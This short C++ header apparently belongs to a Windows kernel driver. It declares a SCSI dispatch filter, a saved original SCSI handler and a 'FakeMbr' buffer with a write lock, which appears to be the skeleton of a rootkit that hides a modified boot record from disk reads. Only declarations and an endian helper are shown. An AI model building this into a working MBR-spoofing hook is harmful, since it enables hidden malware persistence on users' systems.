//C++ templates in a driver, sue me
template <typename T>
T swap_endian(T u)
{
	union
	{
		T u;
		unsigned char u8[sizeof(T)];
	} source, dest;

	source.u = u;

	for (size_t k = 0; k < sizeof(T); k++)
		dest.u8[k] = source.u8[sizeof(T) - k - 1];

	return dest.u;
}

//Custom context structure for completion routine
typedef struct  
{
	PIO_COMPLETION_ROUTINE OriginalRoutine;
	PVOID OriginalContext;
	UCHAR OriginalControl;
	ULONG LBA;
	USHORT TransferLength;
} COMPLETION_CTX, *PCOMPLETION_CTX;

NTSTATUS ScsiFilter(PDEVICE_OBJECT DeviceObject, PIRP Irp);
typedef NTSTATUS(*TypeMajorFunction)(PDEVICE_OBJECT DeviceObject, PIRP Irp);

extern PVOID FakeMbr;
extern TypeMajorFunction OriginalScsi;
extern KSPIN_LOCK FakeMbrWriteLock;
extern PDEVICE_OBJECT TargetDevice;